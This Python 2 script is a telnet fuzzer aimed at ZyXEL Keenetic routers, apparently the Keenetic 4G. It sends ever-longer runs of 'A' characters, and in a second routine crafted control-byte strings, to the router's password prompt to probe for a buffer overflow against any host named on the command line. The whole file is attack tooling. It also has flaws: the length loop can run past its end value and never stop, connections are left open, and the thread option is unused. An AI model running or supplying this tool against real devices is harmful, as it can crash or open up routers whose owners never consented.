#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#               Dummy telnet fuzzer for ZyXELL Keenetic
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#
# MacBookPro:~ 090h$ telnet 1.0.0.1
# Trying 1.0.0.1...
# Connected to 1.0.0.1.
# Escape character is '^]'.
#
# Password :
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Vulnerable routers: ZyXEL Keenetic 4G, any other?
#
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#
# author: @090h
#
from telnetlib import *
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter
from datetime import datetime
import logging

class ZyxellFuzzer(object):

    def __init__(self, host, port=23, debug=False):
        self.host = host
        self.port = port
        root = logging.getLogger()
        if debug:
            root.setLevel(logging.DEBUG)

    def fuzz_bof(self, start=1, finish=0):
        logging.info("Start telnet fuzzing %s:%i" % (self.host, self.port))
        tn = Telnet()
        buflen = start
        while buflen != finish:
            tn.open(self.host, self.port)

            # Attempts limit == 3
            for x in xrange(0,3):
                buf = 'A'*buflen
                print("Trying length: %i 0x%X" % (len(buf), len(buf)))
                logging.debug(tn.read_until('Password :'))
                tn.write(buf+'\n')
                buflen += 1

    def fuzz2(self, length=0x42):
        logging.info("Start telnet fuzzing %s:%i" % (self.host, self.port))
        tn = Telnet()
        buf = chr(19)*(length - 1)

        for x in xrange(20, 255):
            tn.open(self.host, self.port)
            print x
            new_buf = buf + chr(x)
            tn.write(new_buf+'\n')
            print tn.read_until('Password :')
            tn.read_until('Password :')
            tn.close()

def main():
    parser = ArgumentParser(description='Dummy telnet fuzzer for ZyXELL Keenetic', formatter_class=ArgumentDefaultsHelpFormatter)
    parser.add_argument('host', help='Telnet host to fuzz')
    parser.add_argument('-p', '--port',  type=int, default=23, required=False, help='telnet port')
    parser.add_argument('-t', '--threads', action='store', type=int, default=5, help='thread count')
    parser.add_argument('-l', '--length', action='store', type=int, default=0x40, help='length start')
    parser.add_argument('--version', action='version', version='%(prog)s 0.01')
    args = parser.parse_args()
    start_time = datetime.now()

    ZyxellFuzzer(args.host, args.port).fuzz_bof(0, args.length)

    logging.debug("Start time: " + start_time.strftime('%Y-%m-%d %H:%M:%S'))
    logging.debug("Finish time: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

if __name__ == '__main__':
    main()